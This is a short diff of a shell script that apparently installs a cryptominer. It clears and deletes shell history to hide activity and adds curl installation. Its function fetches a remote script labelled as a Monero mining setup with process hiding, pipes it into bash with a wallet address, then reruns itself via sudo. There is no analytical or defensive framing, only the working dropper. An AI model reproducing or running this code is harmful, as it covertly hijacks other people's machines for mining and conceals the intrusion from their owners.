@@ -4,6 +4,9 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-2))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-2))
 
+apt install curl
+yum install curl
+
 rootstuff(){
   curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
   [ "$USER" != root ] && sudo -u "$USER" "$0"
